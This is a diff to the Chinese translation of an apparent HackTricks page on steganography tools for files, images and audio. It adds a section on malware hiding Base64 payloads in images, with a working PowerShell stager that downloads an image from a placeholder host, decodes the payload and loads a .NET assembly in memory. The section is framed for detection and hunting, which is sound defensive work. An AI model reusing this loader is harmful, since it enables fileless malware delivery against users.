@@ -1,4 +1,4 @@
-# Stego Tricks
+# Stego 技巧
 
 {{#include ../banners/hacktricks-training.md}}
 
@@ -6,7 +6,7 @@
 
 ### **Binwalk**
 
-一个用于搜索二进制文件中嵌入的隐藏文件和数据的工具。它通过 `apt` 安装，源代码可在 [GitHub](https://github.com/ReFirmLabs/binwalk) 上获取。
+用于在二进制文件中搜索嵌入的隐藏文件和数据的工具。它可以通过 `apt` 安装，源码可在 [GitHub](https://github.com/ReFirmLabs/binwalk) 获取。
 ```bash
 binwalk file # Displays the embedded data
 binwalk -e file # Extracts the data
@@ -14,27 +14,28 @@ binwalk --dd ".*" file # Extracts all data
 ```
 ### **Foremost**
 
-根据文件的头部和尾部恢复文件，对 png 图像非常有用。通过 `apt` 安装，源代码在 [GitHub](https://github.com/korczis/foremost) 上。
+根据文件的头部和尾部恢复文件，对 png 图像很有用。可通过 `apt` 安装，源代码托管在 [GitHub](https://github.com/korczis/foremost) 上。
 ```bash
 foremost -i file # Extracts data
 ```
 ### **Exiftool**
 
-帮助查看文件元数据，访问 [这里](https://www.sno.phy.queensu.ca/~phil/exiftool/)。
+帮助查看文件元数据，可在 [here](https://www.sno.phy.queensu.ca/~phil/exiftool/) 获取。
 ```bash
 exiftool file # Shows the metadata
 ```
 ### **Exiv2**
 
-类似于 exiftool，用于查看元数据。可以通过 `apt` 安装，源代码在 [GitHub](https://github.com/Exiv2/exiv2)，并且有一个 [官方网站](http://www.exiv2.org/)。
+类似于 exiftool，用于查看元数据。  
+可通过 `apt` 安装，源码在 [GitHub](https://github.com/Exiv2/exiv2)，并且有一个 [official website](http://www.exiv2.org/)。
 ```bash
 exiv2 file # Shows the metadata
 ```
-### **文件**
+### **File**
 
-识别您正在处理的文件类型。
+识别你正在处理的文件类型。
 
-### **字符串**
+### **Strings**
 
 从文件中提取可读字符串，使用各种编码设置来过滤输出。
 ```bash
@@ -50,82 +51,82 @@ strings -e B -n 6 file # 32bit strings (big-endian)
 ```
 ### **比较 (cmp)**
 
-用于将修改过的文件与在线找到的原始版本进行比较。
+用于比较已修改文件与其在线原始版本。
 ```bash
 cmp original.jpg stego.jpg -b -l
 ```
-## **提取文本中的隐藏数据**
+## **在文本中提取隐藏数据**
 
 ### **空格中的隐藏数据**
 
-看似空白的空间中的不可见字符可能隐藏着信息。要提取这些数据，请访问 [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder)。
+看似空白的空格中可能藏有不可见字符。要提取这些数据，请访问 [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder)。
 
 ## **从图像中提取数据**
 
-### **使用 GraphicMagick 识别图像细节**
+### **使用 GraphicMagick 识别图像详情**
 
-[GraphicMagick](https://imagemagick.org/script/download.php) 用于确定图像文件类型并识别潜在的损坏。执行以下命令以检查图像：
+[GraphicMagick](https://imagemagick.org/script/download.php) 用于确定图像文件类型并识别潜在的损坏。执行下面的命令以检查图像：
 ```bash
 ./magick identify -verbose stego.jpg
 ```
-要尝试修复损坏的图像，添加元数据注释可能会有所帮助：
+要尝试修复损坏的图像，添加元数据注释可能有帮助：
 ```bash
 ./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
 ```
-### **Steghide用于数据隐藏**
+### **Steghide 用于数据隐藏**
 
-Steghide 方便地在 `JPEG, BMP, WAV, 和 AU` 文件中隐藏数据，能够嵌入和提取加密数据。使用 `apt` 安装非常简单，其 [源代码可在 GitHub 上获取](https://github.com/StefanoDeVuono/steghide)。
+Steghide 可以将数据隐藏在 `JPEG, BMP, WAV, and AU` 文件中，能够嵌入和提取加密数据。使用 `apt` 安装很简单，其 [source code is available on GitHub](https://github.com/StefanoDeVuono/steghide).
 
 **命令：**
 
 - `steghide info file` 显示文件是否包含隐藏数据。
-- `steghide extract -sf file [--passphrase password]` 提取隐藏数据，密码可选。
+- `steghide extract -sf file [--passphrase password]` 提取隐藏的数据（密码为可选）。
 
-要进行基于网页的提取，请访问 [此网站](https://futureboy.us/stegano/decinput.html)。
+如需基于网页的提取，请访问 [this website](https://futureboy.us/stegano/decinput.html).
 
-**使用 Stegcracker 进行暴力破解攻击：**
+**Bruteforce Attack with Stegcracker:**
 
-- 要尝试对 Steghide 进行密码破解，请使用 [stegcracker](https://github.com/Paradoxis/StegCracker.git) 如下：
+- 要对 Steghide 尝试密码破解，请使用 [stegcracker](https://github.com/Paradoxis/StegCracker.git)，如下：
 ```bash
 stegcracker <file> [<wordlist>]
 ```
-### **zsteg用于PNG和BMP文件**
+### **zsteg for PNG and BMP Files**
 
-zsteg专注于揭示PNG和BMP文件中的隐藏数据。安装通过`gem install zsteg`完成，其[源代码在GitHub上](https://github.com/zed-0xff/zsteg)。
+zsteg 专注于发掘 PNG 和 BMP 文件中的隐藏数据。安装通过 `gem install zsteg` 完成，源码见其 [GitHub](https://github.com/zed-0xff/zsteg)。
 
-**命令：**
+**Commands:**
 
-- `zsteg -a file`对文件应用所有检测方法。
-- `zsteg -E file`指定用于数据提取的有效载荷。
+- `zsteg -a file` 对文件应用所有检测方法。
+- `zsteg -E file` 指定用于数据提取的 payload。
 
-### **StegoVeritas和Stegsolve**
+### **StegoVeritas and Stegsolve**
 
-**stegoVeritas**检查元数据，执行图像转换，并应用LSB暴力破解等功能。使用`stegoveritas.py -h`获取完整选项列表，使用`stegoveritas.py stego.jpg`执行所有检查。
+**stegoVeritas** 会检查 metadata，执行图像转换，并应用 LSB brute forcing 等功能。使用 `stegoveritas.py -h` 查看完整选项列表，或运行 `stegoveritas.py stego.jpg` 执行所有检查。
 
-**Stegsolve**应用各种颜色滤镜以揭示图像中的隐藏文本或消息。它可在[GitHub上](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve)获取。
+**Stegsolve** 通过应用各种颜色滤镜来揭示图像中的隐藏文本或信息。可在其 [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve) 获取。
 
-### **FFT用于隐藏内容检测**
+### **FFT for Hidden Content Detection**
 
-快速傅里叶变换（FFT）技术可以揭示图像中的隐蔽内容。实用资源包括：
+Fast Fourier Transform (FFT) 技术可以揭示图像中隐藏的内容。 有用的资源包括：
 
-- [EPFL演示](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
+- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
 - [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
-- [GitHub上的FFTStegPic](https://github.com/0xcomposure/FFTStegPic)
+- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)
 
-### **Stegpy用于音频和图像文件**
+### **Stegpy for Audio and Image Files**
 
-Stegpy允许将信息嵌入图像和音频文件，支持PNG、BMP、GIF、WebP和WAV等格式。它可在[GitHub上](https://github.com/dhsdshdhk/stegpy)获取。
+Stegpy 允许将信息嵌入图像和音频文件，支持的格式包括 PNG、BMP、GIF、WebP 和 WAV。可在其 [GitHub](https://github.com/dhsdshdhk/stegpy) 获取。
 
-### **Pngcheck用于PNG文件分析**
+### **Pngcheck for PNG File Analysis**
 
-要分析PNG文件或验证其真实性，请使用：
+要分析 PNG 文件或验证其真实性，请使用：
 ```bash
 apt-get install pngcheck
 pngcheck stego.png
 ```
-### **图像分析的附加工具**
+### **用于图像分析的附加工具**
 
-要进一步探索，请考虑访问：
+如需进一步探索，请访问：
 
 - [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
 - [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
@@ -133,27 +134,57 @@ pngcheck stego.png
 - [OpenStego](https://www.openstego.com/)
 - [DIIT](https://diit.sourceforge.net/)
 
+## 标记分隔的 Base64 payloads 隐藏在图像中 (malware delivery)
+
+Commodity loaders 越来越多地将 Base64-encoded payloads 以纯文本形式隐藏在看似有效的图像内部（通常为 GIF/PNG）。与像素级 LSB 不同，这些 payload 是通过嵌入在文件文本/metadata 中的唯一起始/结束标记字符串来分隔的。然后 PowerShell stager 会：
+
+- Downloads the image over HTTP(S)
+- 定位标记字符串（观察到的示例：<<sudo_png>> … <<sudo_odt>>）
+- 提取两标记之间的文本并将其 Base64 解码为字节
+- 在内存中加载 .NET assembly 并调用已知的入口方法（不将文件写入磁盘）
+
+Minimal PowerShell carving/loading snippet
+```powershell
+$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
+$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
+$s = $img.IndexOf($start); $e = $img.IndexOf($end)
+if($s -ge 0 -and $e -gt $s){
+$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
+$bytes = [Convert]::FromBase64String($b64)
+[Reflection.Assembly]::Load($bytes) | Out-Null
+}
+```
+备注
+- 这属于 ATT&CK T1027.003 (steganography)。标记字符串在不同 campaign 之间会有所不同。
+- Hunting：扫描下载的图片以查找已知的分隔符；标记使用 `DownloadString` 后跟 `FromBase64String` 的 `PowerShell`。
+
+See also phishing delivery examples and full in-memory invocation flow here:
+
+{{#ref}}
+../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
+{{#endref}}
+
 ## **从音频中提取数据**
 
-**音频隐写术**提供了一种独特的方法，将信息隐藏在声音文件中。使用不同的工具来嵌入或检索隐藏的内容。
+**Audio steganography** 提供了一种在音频文件中隐藏信息的独特方法。不同工具用于嵌入或提取隐藏内容。
 
 ### **Steghide (JPEG, BMP, WAV, AU)**
 
-Steghide是一个多功能工具，旨在将数据隐藏在JPEG、BMP、WAV和AU文件中。详细说明请参见[stego tricks documentation](stego-tricks.md#steghide)。
+Steghide 是一个多功能工具，用于在 JPEG、BMP、WAV 和 AU 文件中隐藏数据。详细说明请参见 [stego tricks documentation](stego-tricks.md#steghide)。
 
 ### **Stegpy (PNG, BMP, GIF, WebP, WAV)**
 
-该工具兼容多种格式，包括PNG、BMP、GIF、WebP和WAV。有关更多信息，请参阅[Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav)。
+该工具兼容多种格式，包括 PNG、BMP、GIF、WebP 和 WAV。更多信息请参阅 [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav)。
 
 ### **ffmpeg**
 
-ffmpeg对于评估音频文件的完整性至关重要，突出详细信息并指出任何差异。
+ffmpeg 对评估音频文件完整性至关重要，能显示详细信息并定位任何不一致之处。
 ```bash
 ffmpeg -v info -i stego.mp3 -f null -
 ```
 ### **WavSteg (WAV)**
 
-WavSteg 擅长使用最低有效位策略在 WAV 文件中隐藏和提取数据。它可以在 [GitHub](https://github.com/ragibson/Steganography#WavSteg) 上获取。命令包括：
+WavSteg 擅长利用 least significant bit 策略在 WAV 文件中隐藏和提取数据。可在 [GitHub](https://github.com/ragibson/Steganography#WavSteg) 获取。命令包括：
 ```bash
 python3 WavSteg.py -r -b 1 -s soundfile -o outputfile
 
@@ -161,34 +192,36 @@ python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
 ```
 ### **Deepsound**
 
-Deepsound 允许使用 AES-256 对声音文件中的信息进行加密和检测。可以从 [the official page](http://jpinsoft.net/deepsound/download.aspx) 下载。
+Deepsound 允许在音频文件中使用 AES-256 对信息进行加密并检测隐藏信息。可从 [the official page](http://jpinsoft.net/deepsound/download.aspx) 下载。
 
 ### **Sonic Visualizer**
 
-Sonic Visualizer 是一个用于音频文件的视觉和分析检查的宝贵工具，可以揭示其他方法无法检测到的隐藏元素。访问 [official website](https://www.sonicvisualiser.org/) 了解更多信息。
+Sonic Visualizer 是用于音频文件的可视化与分析检查的宝贵工具，能够揭示其他方法无法发现的隐藏元素。更多信息请访问 [official website](https://www.sonicvisualiser.org/)。
 
 ### **DTMF Tones - Dial Tones**
 
-通过在线工具可以检测音频文件中的 DTMF 音调，例如 [this DTMF detector](https://unframework.github.io/dtmf-detect/) 和 [DialABC](http://dialabc.com/sound/detect/index.html)。
+可以通过像 [this DTMF detector](https://unframework.github.io/dtmf-detect/) 和 [DialABC](http://dialabc.com/sound/detect/index.html) 这样的在线工具检测音频文件中的 DTMF 音。
 
-## **Other Techniques**
+## **其他技术**
 
 ### **Binary Length SQRT - QR Code**
 
-平方为整数的二进制数据可能表示 QR 码。使用此代码片段进行检查：
+二进制长度的平方根为整数的数据可能代表一个 QR Code。使用此代码片段来检查：
 ```python
 import math
 math.sqrt(2500) #50
 ```
-对于二进制到图像的转换，请查看 [dcode](https://www.dcode.fr/binary-image)。要读取二维码，请使用 [this online barcode reader](https://online-barcode-reader.inliteresearch.com/)。
+要将二进制转换为图像，请查看 [dcode](https://www.dcode.fr/binary-image)。要读取 QR 码，请使用 [this online barcode reader](https://online-barcode-reader.inliteresearch.com/)。
 
 ### **盲文翻译**
 
-对于盲文翻译，[Branah Braille Translator](https://www.branah.com/braille-translator) 是一个很好的资源。
+要翻译盲文， [Branah Braille Translator](https://www.branah.com/braille-translator) 是一个极好的资源。
 
-## **参考文献**
+## **参考资料**
 
 - [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
 - [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
+- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
+- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
 
 {{#include ../banners/hacktricks-training.md}}
